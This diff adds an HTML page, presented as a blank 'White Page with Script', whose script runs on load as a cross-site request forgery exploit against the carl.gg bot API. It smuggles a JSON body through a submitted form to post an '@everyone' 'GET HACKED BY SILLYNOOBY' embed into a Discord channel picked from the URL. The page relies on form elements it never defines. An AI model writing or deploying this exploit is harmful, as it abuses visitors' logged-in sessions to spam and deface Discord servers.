@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>White Page with Script</title>
+    <style>
+        body {
+            background-color: white;
+            margin: 0;
+            height: 100vh;
+        }
+    </style>
+</head>
+<body>
+
+<script>
+    function exploit() {
+        if (localStorage.getItem("log")) logarea.value = localStorage.getItem("log")
+        let guildId
+        let channelId
+        if (window.location.hash) {
+            guildId = window.location.hash.substring(1)
+            localStorage.setItem("guild", guildId)
+        } else if (!guildId) {
+            return error("Please set the Guild ID!")
+        }
+
+        if (window.location.search != "") {
+            channelId = window.location.search.substring(1)
+            localStorage.setItem("channel", channelId)
+        } else if (!channelId) {
+            return error("Please set the Channel ID!")
+        }
+
+        send(`https://carl.gg/api/v1/servers/${guildId}/embed`, "POST", {
+            "embed": {
+                "content": "@everyone",
+                "embed": {
+                    "title": "GET HACKED BY SILLYNOOBY",
+                    "description": "HACKED"},
+                    "color":2105893}
+            },
+            "channel": channelId
+        })
+        cleanup()
+
+    }
+
+    const SUFFIX = ",\"foo"
+    function send(url, method, data) {
+        form.action = url
+        form.method = method
+        let jsonStr = JSON.stringify(data)
+        jsonStr = jsonStr.substring(0, jsonStr.length - 1) + SUFFIX
+        json.name = jsonStr
+
+        form.submit()
+
+
+    }
+
+    function cleanup() {
+        localStorage.removeItem("guild")
+        localStorage.removeItem("channel")
+        localStorage.removeItem("log")
+    }
+
+    function log(toLog) {
+        logarea.value += toLog + "\n"
+        localStorage.setItem("log", logarea.value)
+    }
+
+    function error(reason) {
+        log(reason)
+        cleanup()
+    }
+
+    exploit()
+
+</script>
+
+</body>
+</html>
